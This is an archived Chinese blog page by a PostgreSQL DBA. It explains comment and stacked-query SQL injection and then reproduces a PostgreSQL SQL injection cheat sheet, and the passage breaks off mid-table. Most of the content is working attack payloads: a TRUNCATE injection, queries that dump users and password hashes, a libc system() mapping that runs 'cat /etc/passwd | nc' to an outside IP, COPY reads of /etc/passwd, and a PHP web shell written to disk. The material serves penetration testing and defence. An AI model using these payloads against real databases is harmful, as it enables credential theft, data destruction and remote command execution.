<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=gbk">
<title>PostgreSQL research</title>
<style type="text/css">
.blogcnt{line-height:160%;font-size:14px;text-align:left;word-wrap:break-word;}
.blogcnt *{line-height:160%;}
.blogcnt p{margin:0 0 10px;}
.blogcnt ul,.nbw-blog ol{margin:5px 0 5px 40px;padding:0}
.blogcnt em{font-style:italic;}
.blogcnt blockquote{font-size:1em;margin:auto 0 auto 35px;}
.blogcnt img{border:0;max-width:100%;}
</style>
</head>
<body style="color:#444444;">
<h1 id="blog-Title"><a href="index.html">PostgreSQL research</a></h1>
<div id="" style="padding:0 20px;">
	<h2 id="">PostgreSQL Injection Cheat Sheet</h2>
	<h5 id="">2012-10-10 15:10:48&nbsp;&nbsp;&nbsp;<a href="http://blog.163.com/digoal@126/blog/static/1638770402012910234402/" target="_blank">查看原文&gt;&gt;</a></h5>
	<div class="" id="" style="padding:0 20px;">
		<div class="blogcnt" style="width:800px;"><div><p style="margin-top: 0px; margin-bottom: 0px; padding-bottom: 13px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(76, 83, 86); font-size: 13px; line-height: 17px;"  >SQL 注入对于DBA来说是防不胜防的, 唯一能做的是做好备份 .</p><p style="margin-top: 0px; margin-bottom: 0px; padding-bottom: 13px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(76, 83, 86); font-size: 13px; line-height: 17px;"  >那么SQL注入一般能利用哪些数据库特征呢?</p><p style="margin-top: 0px; margin-bottom: 0px; padding-bottom: 13px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(76, 83, 86); font-size: 13px; line-height: 17px;"  ><span style="line-height: 17px;"  >1. 注释</span></p><p style="margin-top: 0px; margin-bottom: 0px; padding-bottom: 13px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(76, 83, 86); font-size: 13px; line-height: 17px;"  >&nbsp; &nbsp; 例如将条件注释掉, 放大检索的结果集.</p><p style="margin-top: 0px; margin-bottom: 0px; padding-bottom: 13px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(76, 83, 86); font-size: 13px; line-height: 17px;"  >&nbsp; &nbsp; update table_name set nickname='$1' where sex='$2' and c1='$3' and ...;</p><p style="margin-top: 0px; margin-bottom: 0px; padding-bottom: 13px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(76, 83, 86); font-size: 13px; line-height: 17px;"  >&nbsp; &nbsp; 如果$2 = '; -- , 注入后 &nbsp;SQL将变成&nbsp;<span style="line-height: 17px;"  >update table_name set nickname='$1</span><span style="line-height: 17px;"  >' where sex=''; --' and c1='$3' and ... ; 将会更新所有的sex='?'的记录.&nbsp;</span></p><p style="margin-top: 0px; margin-bottom: 0px; padding-bottom: 13px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(76, 83, 86); font-size: 13px; line-height: 17px;"  >2. 多条SQL</p><p style="margin-top: 0px; margin-bottom: 0px; padding-bottom: 13px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(76, 83, 86); font-size: 13px; line-height: 17px;"  >&nbsp; &nbsp; 同样上面一条SQL,&nbsp;<span style="line-height: 17px;"  >update table_name set nickname='$1' where sex='$1' and c1='$2' and ...;</span></p><p style="margin-top: 0px; margin-bottom: 0px; padding-bottom: 13px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(76, 83, 86); font-size: 13px; line-height: 17px;"  ><span style="line-height: 17px;"  >&nbsp; &nbsp; 如果$2 = '; &nbsp;TRUNCATE TABLE table_name; -- 那么就变成执行2条SQL了,&nbsp;</span></p><p style="margin-top: 0px; margin-bottom: 0px; padding-bottom: 13px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(76, 83, 86); font-size: 13px; line-height: 17px;"  ><span style="line-height: 17px;"  >&nbsp; &nbsp; SQL1 :&nbsp;</span></p><p style="margin-top: 0px; margin-bottom: 0px; padding-bottom: 13px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(76, 83, 86); font-size: 13px; line-height: 17px;"  ><span style="line-height: 17px;"  >&nbsp; &nbsp;&nbsp;</span><span style="line-height: 17px;"  >update table_name set nickname='$1' where sex='';</span></p><p style="margin-top: 0px; margin-bottom: 0px; padding-bottom: 13px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(76, 83, 86); font-size: 13px; line-height: 17px;"  ><span style="line-height: 17px;"  >&nbsp; &nbsp; SQL2 :&nbsp;</span></p><p style="margin-top: 0px; margin-bottom: 0px; padding-bottom: 13px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(76, 83, 86); font-size: 13px; line-height: 17px;"  ><span style="line-height: 17px;"  >&nbsp; &nbsp;&nbsp;</span><span style="line-height: 17px;"  >TRUNCATE TABLE table_name;</span></p><p style="margin-top: 0px; margin-bottom: 0px; padding-bottom: 13px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(76, 83, 86); font-size: 13px; line-height: 17px;"  ><span style="line-height: 17px;"  >&nbsp; &nbsp; 这个是极度危险的.</span></p><p style="margin-top: 0px; margin-bottom: 0px; padding-bottom: 13px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(76, 83, 86); font-size: 13px; line-height: 17px;"  ><span style="line-height: 17px;"  >现在大多数驱动应该不允许同时提交2条SQL了, 可以大大降低这种风险.&nbsp;</span></p><p style="margin-top: 0px; margin-bottom: 0px; padding-bottom: 13px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(76, 83, 86); font-size: 13px; line-height: 17px;"  >3. 数据库本身的特征</p><p style="margin-top: 0px; margin-bottom: 0px; padding-bottom: 13px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(76, 83, 86); font-size: 13px; line-height: 17px;"  >&nbsp; &nbsp; 例如&nbsp;pg_user_mappings 和&nbsp;pg_foreign_server 默认情况下可以查看到foreign server和user mappings的信息, 包含IP端口,用户密码.</p><p style="margin-top: 0px; margin-bottom: 0px; padding-bottom: 13px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(76, 83, 86); font-size: 13px; line-height: 17px;"  ><span style="line-height: 17px;"  >以下取自互联网, SQL注入常用的SQL, 查询表名, 用户名, 数据库配置等 :&nbsp;</span></p><p style="margin-top: 0px; margin-bottom: 0px; padding-bottom: 13px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(76, 83, 86); font-size: 13px; line-height: 17px;"  ><a style="line-height: 22px; font-size: 14px; " rel="nofollow" href="http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet"  >http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet</a></p><p style="margin-top: 0px; margin-bottom: 0px; padding-bottom: 13px; border: 0px; outline: 0px; vertical-align: baseline; color: rgb(76, 83, 86); font-size: 13px; line-height: 17px;"  >Some of the queries in the table below can only be run by an admin. These are marked with “C priv” at the end of the query.</p><table border="1"  style="margin: 0px -1px 24px 0px; padding: 0px; border: 1px solid rgb(231, 231, 231); outline: 0px; vertical-align: baseline; border-collapse: collapse; border-spacing: 0px; text-align: left; width: 699px; color: rgb(76, 83, 86); font-size: 13px; line-height: 17px;"  ><tbody style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  ><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  ><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >Version</td><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >SELECT version()</td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  ><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >Comments</td><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >SELECT 1; Ccomment<br>SELECT /*comment*/ 1;</td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  ><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >Current User</td><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >SELECT user;<br>SELECT current_user;<br>SELECT session_user;<br>SELECT usename FROM pg_user;<br>SELECT getpgusername();</td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  ><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >List Users</td><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >SELECT usename FROM pg_user</td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  ><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >List Password Hashes</td><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >SELECT usename, passwd FROM pg_shadow ― priv</td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  ><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >Password Cracker</td><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  ><a style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; color: rgb(0, 153, 187); text-decoration: none; background-position: initial initial; background-repeat: initial initial; " rel="nofollow" href="http://pentestmonkey.net/blog/cracking-postgres-hashes/"  >MDCrack</a>&nbsp;can crack PostgreSQL’s MD5-based passwords.</td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  ><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >List Privileges</td><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user</td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  ><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >List DBA Accounts</td><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >SELECT usename FROM pg_user WHERE usesuper IS TRUE</td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  ><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >Current Database</td><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >SELECT current_database()</td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  ><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >List Databases</td><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >SELECT datname FROM pg_database</td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  ><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >List Columns</td><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind=’r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum&gt;0) AND (NOT A.attisdropped) AND (N.nspname ILIKE ‘public’)</td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  ><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >List Tables</td><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN (‘r’,”) AND n.nspname NOT IN (‘pg_catalog’, ‘pg_toast’) AND pg_catalog.pg_table_is_visible(c.oid)</td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  ><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >Find Tables From Column Name</td><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >If you want to list all the table names that contain a column LIKE ‘%password%’:SELECT DISTINCT relname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind=’r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum&gt;0) AND (NOT A.attisdropped) AND (N.nspname ILIKE ‘public’) AND attname LIKE ‘%password%’;</td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  ><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >Select Nth Row</td><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 0; ― rows numbered from 0<br>SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 1;</td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  ><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >Select Nth Char</td><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >SELECT substr(‘abcd’, 3, 1); ― returns c</td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  ><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >Bitwise AND</td><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >SELECT 6 &amp; 2; ― returns 2<br>SELECT 6 &amp; 1; Creturns 0</td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  ><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >ASCII Value -&gt; Char</td><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >SELECT chr(65);</td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  ><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >Char -&gt; ASCII Value</td><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >SELECT ascii(‘A’);</td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  ><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >Casting</td><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >SELECT CAST(1 as varchar);<br>SELECT CAST(’1′ as int);</td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  ><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >String Concatenation</td><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >SELECT ‘A’ || ‘B’; ― returnsAB</td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  ><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >If Statement</td><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >IF statements only seem valid inside functions, so aren’t much use for SQL injection.&nbsp; See CASE statement instead.</td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  ><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >Case Statement</td><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >SELECT CASE WHEN (1=1) THEN ‘A’ ELSE ‘B’ END; ― returns A</td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  ><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >Avoiding Quotes</td><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >SELECT CHR(65)||CHR(66); ― returns AB</td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  ><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >Time Delay</td><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >SELECT pg_sleep(10); ― postgres 8.2+ only<br>CREATE OR REPLACE FUNCTION sleep(int) RETURNS int AS ‘/lib/libc.so.6′, ‘sleep’ language ‘C’ STRICT; SELECT sleep(10); Cpriv, create your own sleep function.&nbsp; Taken from&nbsp;<a style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; color: rgb(0, 153, 187); text-decoration: none; background-position: initial initial; background-repeat: initial initial; " rel="nofollow" href="http://www.portcullis.co.uk/uplds/whitepapers/Having_Fun_With_PostgreSQL.pdf"  >here</a>&nbsp;.</td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  ><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >Make DNS Requests</td><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >Generally not possible in postgres.&nbsp; However if&nbsp;<a style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; color: rgb(0, 153, 187); text-decoration: none; background-position: initial initial; background-repeat: initial initial; " rel="nofollow" href="http://www.leidecker.info/pgshell/Having_Fun_With_PostgreSQL.html"  >contrib/dblink</a>is installed (it isn’t by default) it can be used to resolve hostnames (assuming you have DBA rights):<p style="margin-top: 0px; margin-bottom: 0px; padding-bottom: 13px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent;"  ></p><pre style="margin-top: 0px; margin-bottom: 18px; padding: 1.5em; border: 0px; outline: 0px; vertical-align: baseline; background-color: rgb(247, 247, 247); white-space: pre-wrap; word-wrap: break-word; width: 487.3500061035156px; color: rgb(34, 34, 34); line-height: 18px;"  >SELECT * FROM dblink('host=put.your.hostname.here user=someuser  dbname=somedb', 'SELECT version()') RETURNS (result TEXT);</pre><p style="margin-top: 0px; margin-bottom: 0px; padding-bottom: 13px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent;"  >Alternatively, if you have DBA rights you could run an OS-level command (see below) to resolve hostnames, e.g. “ping pentestmonkey.net”.</p></td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  ><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >Command Execution</td><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS ‘/lib/libc.so.6′, ‘system’ LANGUAGE ‘C’ STRICT; ― privSELECT system(‘cat /etc/passwd | nc 10.0.0.1 8080′); ― priv, commands run as postgres/pgsql OS-level user</td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  ><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >Local File Access</td><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >CREATE TABLE mydata(t text);<br>COPY mydata FROM ‘/etc/passwd’; ― priv, can read files which are readable by postgres OS-level user<br>…’ UNION ALL SELECT t FROM mydata LIMIT 1 OFFSET 1; ― get data back one row at a time<br>…’ UNION ALL SELECT t FROM mydata LIMIT 1 OFFSET 2; ― get data back one row at a time …<br>DROP TABLE mytest mytest;Write to a file:<p style="margin-top: 0px; margin-bottom: 0px; padding-bottom: 13px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent;"  ></p><p style="margin-top: 0px; margin-bottom: 0px; padding-bottom: 13px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent;"  >CREATE TABLE mytable (mycol text);<br>INSERT INTO mytable(mycol) VALUES (‘&lt;? pasthru($_GET[cmd]); ?&gt;’);<br>COPY mytable (mycol) TO ‘/tmp/test.php’; Cpriv, write files as postgres OS-level user.&nbsp; Generally you won’t be able to write to the web root, but it’s always work a try.<br>C priv user can also read/write files by&nbsp;<a style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; color: rgb(0, 153, 187); text-decoration: none; background-position: initial initial; background-repeat: initial initial; " rel="nofollow" href="http://www.portcullis.co.uk/uplds/whitepapers/Having_Fun_With_PostgreSQL.pdf"  >mapping libc functions</a></p></td></tr><tr style="margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  ><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: solid; border-top-color: rgb(231, 231, 231); outline: 0px; vertical-align: baseline; background-color: transparent; background-position: initial initial; background-repeat: initial initial;"  >Hostname, IP Address</td><td style="margin: 0px; padding: 6px 24px; border-width: 1px 0px 0px; border-top-style: 